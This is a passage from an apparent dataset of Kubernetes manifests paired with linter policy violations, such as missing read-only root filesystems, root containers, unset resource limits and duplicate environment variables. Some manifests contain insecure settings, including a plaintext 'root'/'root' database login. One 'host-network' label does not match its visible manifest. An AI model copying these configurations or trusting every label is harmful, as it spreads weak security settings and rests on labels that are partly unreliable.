    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mllp-adapter-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mllp-adapter\n  template:\n    metadata:\n      labels:\n        app: mllp-adapter\n    spec:\n      containers:\n      - name: mllp-adapter\n        imagePullPolicy: Always\n        image: gcr.io/cloud-healthcare-containers/mllp-adapter:<IMAGE_LABEL>\n        ports:\n        - containerPort: 2575\n          protocol: TCP\n          name: port\n        command:\n        - /usr/mllp_adapter/mllp_adapter\n        - --port=2575\n        - --hl7_v2_project_id=<PROJECT_ID>\n        - --hl7_v2_location_id=<LOCATION_ID>\n        - --hl7_v2_dataset_id=<DATASET_ID>\n        - --hl7_v2_store_id=<STORE_ID>\n        - --logtostderr\n        - --receiver_ip=<RECEIVER_IP>\n        - --pubsub_project_id=<PUBSUB_PROJECT_ID>\n        - --pubsub_subscription=<PUBSUB_SUBSCRIPTION_ID>\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mllp-adapter\" does not have a read-only root file system"
  },
  {
    "id": "10835",
    "manifest_path": "data/manifests/the_stack_sample/sample_4166.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mllp-adapter-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mllp-adapter\n  template:\n    metadata:\n      labels:\n        app: mllp-adapter\n    spec:\n      containers:\n      - name: mllp-adapter\n        imagePullPolicy: Always\n        image: gcr.io/cloud-healthcare-containers/mllp-adapter:<IMAGE_LABEL>\n        ports:\n        - containerPort: 2575\n          protocol: TCP\n          name: port\n        command:\n        - /usr/mllp_adapter/mllp_adapter\n        - --port=2575\n        - --hl7_v2_project_id=<PROJECT_ID>\n        - --hl7_v2_location_id=<LOCATION_ID>\n        - --hl7_v2_dataset_id=<DATASET_ID>\n        - --hl7_v2_store_id=<STORE_ID>\n        - --logtostderr\n        - --receiver_ip=<RECEIVER_IP>\n        - --pubsub_project_id=<PUBSUB_PROJECT_ID>\n        - --pubsub_subscription=<PUBSUB_SUBSCRIPTION_ID>\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mllp-adapter\" is not set to runAsNonRoot"
  },
  {
    "id": "10836",
    "manifest_path": "data/manifests/the_stack_sample/sample_4166.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mllp-adapter-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mllp-adapter\n  template:\n    metadata:\n      labels:\n        app: mllp-adapter\n    spec:\n      containers:\n      - name: mllp-adapter\n        imagePullPolicy: Always\n        image: gcr.io/cloud-healthcare-containers/mllp-adapter:<IMAGE_LABEL>\n        ports:\n        - containerPort: 2575\n          protocol: TCP\n          name: port\n        command:\n        - /usr/mllp_adapter/mllp_adapter\n        - --port=2575\n        - --hl7_v2_project_id=<PROJECT_ID>\n        - --hl7_v2_location_id=<LOCATION_ID>\n        - --hl7_v2_dataset_id=<DATASET_ID>\n        - --hl7_v2_store_id=<STORE_ID>\n        - --logtostderr\n        - --receiver_ip=<RECEIVER_IP>\n        - --pubsub_project_id=<PUBSUB_PROJECT_ID>\n        - --pubsub_subscription=<PUBSUB_SUBSCRIPTION_ID>\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mllp-adapter\" has cpu request 0"
  },
  {
    "id": "10837",
    "manifest_path": "data/manifests/the_stack_sample/sample_4166.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mllp-adapter-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mllp-adapter\n  template:\n    metadata:\n      labels:\n        app: mllp-adapter\n    spec:\n      containers:\n      - name: mllp-adapter\n        imagePullPolicy: Always\n        image: gcr.io/cloud-healthcare-containers/mllp-adapter:<IMAGE_LABEL>\n        ports:\n        - containerPort: 2575\n          protocol: TCP\n          name: port\n        command:\n        - /usr/mllp_adapter/mllp_adapter\n        - --port=2575\n        - --hl7_v2_project_id=<PROJECT_ID>\n        - --hl7_v2_location_id=<LOCATION_ID>\n        - --hl7_v2_dataset_id=<DATASET_ID>\n        - --hl7_v2_store_id=<STORE_ID>\n        - --logtostderr\n        - --receiver_ip=<RECEIVER_IP>\n        - --pubsub_project_id=<PUBSUB_PROJECT_ID>\n        - --pubsub_subscription=<PUBSUB_SUBSCRIPTION_ID>\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mllp-adapter\" has memory limit 0"
  },
  {
    "id": "10838",
    "manifest_path": "data/manifests/the_stack_sample/sample_4168.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.1.0\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 7c0bafc70543060109f92a26a0933f703b128818439c64d26a9c2b741f8285a8\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.service.fms.local\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 9d91f5aafd473204df9f47346c95217dc619d5a7\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-tekton-controller\" does not have a read-only root file system"
  },
  {
    "id": "10839",
    "manifest_path": "data/manifests/the_stack_sample/sample_4168.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.1.0\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 7c0bafc70543060109f92a26a0933f703b128818439c64d26a9c2b741f8285a8\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.service.fms.local\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 9d91f5aafd473204df9f47346c95217dc619d5a7\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-tekton-controller\" not found"
  },
  {
    "id": "10840",
    "manifest_path": "data/manifests/the_stack_sample/sample_4168.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.1.0\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 7c0bafc70543060109f92a26a0933f703b128818439c64d26a9c2b741f8285a8\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.service.fms.local\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 9d91f5aafd473204df9f47346c95217dc619d5a7\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-tekton-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "10841",
    "manifest_path": "data/manifests/the_stack_sample/sample_4169.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: ketidevit2/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: 10.0.3.20\n        - name: INFLUX_PORT\n          value: '30003'\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"openmcp-analytic-engine\" does not have a read-only root file system"
  },
  {
    "id": "10842",
    "manifest_path": "data/manifests/the_stack_sample/sample_4169.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: ketidevit2/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: 10.0.3.20\n        - name: INFLUX_PORT\n          value: '30003'\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"openmcp-analytic-engine\" not found"
  },
  {
    "id": "10843",
    "manifest_path": "data/manifests/the_stack_sample/sample_4169.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: ketidevit2/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: 10.0.3.20\n        - name: INFLUX_PORT\n          value: '30003'\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"openmcp-analytic-engine\" is not set to runAsNonRoot"
  },
  {
    "id": "10844",
    "manifest_path": "data/manifests/the_stack_sample/sample_4169.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: ketidevit2/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: 10.0.3.20\n        - name: INFLUX_PORT\n          value: '30003'\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"openmcp-analytic-engine\" has cpu request 0"
  },
  {
    "id": "10845",
    "manifest_path": "data/manifests/the_stack_sample/sample_4169.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: ketidevit2/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: 10.0.3.20\n        - name: INFLUX_PORT\n          value: '30003'\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"openmcp-analytic-engine\" has memory limit 0"
  },
  {
    "id": "10846",
    "manifest_path": "data/manifests/the_stack_sample/sample_4170.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: server\n  template:\n    metadata:\n      labels:\n        component: server\n    spec:\n      containers:\n      - name: server\n        image: stephengrider/multi-server\n        ports:\n        - containerPort: 5000\n        env:\n        - name: REDIS_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_PORT\n          value: postgres\n        - name: PGHOST\n          value: postgres-custer-ip-service\n        - name: PGHOST\n          value: '5432'\n        - name: PGDATABASE\n          value: postgres\n        - name: PGPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n",
    "policy_id": "duplicate-env-var",
    "violation_text": "Duplicate environment variable PGHOST in container \"server\" found"
  },
  {
    "id": "10847",
    "manifest_path": "data/manifests/the_stack_sample/sample_4170.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: server\n  template:\n    metadata:\n      labels:\n        component: server\n    spec:\n      containers:\n      - name: server\n        image: stephengrider/multi-server\n        ports:\n        - containerPort: 5000\n        env:\n        - name: REDIS_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_PORT\n          value: postgres\n        - name: PGHOST\n          value: postgres-custer-ip-service\n        - name: PGHOST\n          value: '5432'\n        - name: PGDATABASE\n          value: postgres\n        - name: PGPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server\" is using an invalid container image, \"stephengrider/multi-server\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10848",
    "manifest_path": "data/manifests/the_stack_sample/sample_4170.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: server\n  template:\n    metadata:\n      labels:\n        component: server\n    spec:\n      containers:\n      - name: server\n        image: stephengrider/multi-server\n        ports:\n        - containerPort: 5000\n        env:\n        - name: REDIS_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_PORT\n          value: postgres\n        - name: PGHOST\n          value: postgres-custer-ip-service\n        - name: PGHOST\n          value: '5432'\n        - name: PGDATABASE\n          value: postgres\n        - name: PGPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10849",
    "manifest_path": "data/manifests/the_stack_sample/sample_4170.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: server\n  template:\n    metadata:\n      labels:\n        component: server\n    spec:\n      containers:\n      - name: server\n        image: stephengrider/multi-server\n        ports:\n        - containerPort: 5000\n        env:\n        - name: REDIS_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_PORT\n          value: postgres\n        - name: PGHOST\n          value: postgres-custer-ip-service\n        - name: PGHOST\n          value: '5432'\n        - name: PGDATABASE\n          value: postgres\n        - name: PGPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "10850",
    "manifest_path": "data/manifests/the_stack_sample/sample_4170.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: server\n  template:\n    metadata:\n      labels:\n        component: server\n    spec:\n      containers:\n      - name: server\n        image: stephengrider/multi-server\n        ports:\n        - containerPort: 5000\n        env:\n        - name: REDIS_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_PORT\n          value: postgres\n        - name: PGHOST\n          value: postgres-custer-ip-service\n        - name: PGHOST\n          value: '5432'\n        - name: PGDATABASE\n          value: postgres\n        - name: PGPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "10851",
    "manifest_path": "data/manifests/the_stack_sample/sample_4170.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: server\n  template:\n    metadata:\n      labels:\n        component: server\n    spec:\n      containers:\n      - name: server\n        image: stephengrider/multi-server\n        ports:\n        - containerPort: 5000\n        env:\n        - name: REDIS_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_PORT\n          value: postgres\n        - name: PGHOST\n          value: postgres-custer-ip-service\n        - name: PGHOST\n          value: '5432'\n        - name: PGDATABASE\n          value: postgres\n        - name: PGPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "10852",
    "manifest_path": "data/manifests/the_stack_sample/sample_4170.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: server\n  template:\n    metadata:\n      labels:\n        component: server\n    spec:\n      containers:\n      - name: server\n        image: stephengrider/multi-server\n        ports:\n        - containerPort: 5000\n        env:\n        - name: REDIS_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_PORT\n          value: postgres\n        - name: PGHOST\n          value: postgres-custer-ip-service\n        - name: PGHOST\n          value: '5432'\n        - name: PGDATABASE\n          value: postgres\n        - name: PGPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "10853",
    "manifest_path": "data/manifests/the_stack_sample/sample_4171.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: istio-ilbgateway\n  namespace: istio-system\n  annotations:\n    cloud.google.com/load-balancer-type: internal\n  labels:\n    chart: gateways\n    heritage: Tiller\n    release: istio\n    app: istio-ilbgateway\n    istio: ilbgateway\nspec:\n  type: LoadBalancer\n  selector:\n    app: istio-ilbgateway\n    istio: ilbgateway\n  ports:\n  - name: grpc-pilot-mtls\n    port: 15011\n  - name: grpc-pilot\n    port: 15010\n  - name: tcp-citadel-grpc-tls\n    port: 8060\n    targetPort: 8060\n  - name: tcp-dns\n    port: 5353\n  - name: grpc\n    port: 443\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:istio-ilbgateway istio:ilbgateway])"
  },
  {
    "id": "10854",
    "manifest_path": "data/manifests/the_stack_sample/sample_4172.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: home-assistant\n  namespace: internet-of-things\n  labels:\n    app.kubernetes.io/name: home-assistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: home-assistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: home-assistant\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.8-alpine\n        ports:\n        - name: http\n          containerPort: 8123\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 50m\n            memory: 128Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        volumeMounts:\n        - name: nginx-config\n          mountPath: /etc/nginx/nginx.conf\n          subPath: nginx.conf\n      - name: home-assistant\n        image: homeassistant/home-assistant:0.107.4\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: api\n          containerPort: 8124\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 180\n          failureThreshold: 5\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 60\n          failureThreshold: 5\n          timeoutSeconds: 10\n        volumeMounts:\n        - mountPath: /config\n          name: config-data\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 512Mi\n      volumes:\n      - name: config-data\n        persistentVolumeClaim:\n          claimName: homeassistant-data-pvc\n      - name: nginx-config\n        configMap:\n          name: home-assistant-nginx-config\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "10855",
    "manifest_path": "data/manifests/the_stack_sample/sample_4172.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: home-assistant\n  namespace: internet-of-things\n  labels:\n    app.kubernetes.io/name: home-assistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: home-assistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: home-assistant\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.8-alpine\n        ports:\n        - name: http\n          containerPort: 8123\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 50m\n            memory: 128Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        volumeMounts:\n        - name: nginx-config\n          mountPath: /etc/nginx/nginx.conf\n          subPath: nginx.conf\n      - name: home-assistant\n        image: homeassistant/home-assistant:0.107.4\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: api\n          containerPort: 8124\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 180\n          failureThreshold: 5\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /\n            port: api\n          initialDelaySeconds: 60\n          failureThreshold: 5\n          timeoutSeconds: 10\n        volumeMounts:\n        - mountPath: /config\n          name: config-data\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 512Mi\n      volumes:\n      - name: config-data\n        persistentVolumeClaim:\n          claimName: homeassistant-data-pvc\n      - name: nginx-config\n        configMap:\n          name: home-assistant-nginx-config\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"home-assistant\" does not have a read-only root file system"
  },
  {
    "id": "10856",
    "manifest_path": "data/manifests/the_stack_sample/sample_4172.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: home-assistant\n  namespace: internet-of-things\n  labels:\n    app.kubernetes.io/name: home-assistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: home-assistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: home-assistant\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.8-alpine\n        ports:\n        - name: http\n          containerPort: 8123\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 50m\n            memory: 128Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/status\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 10\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            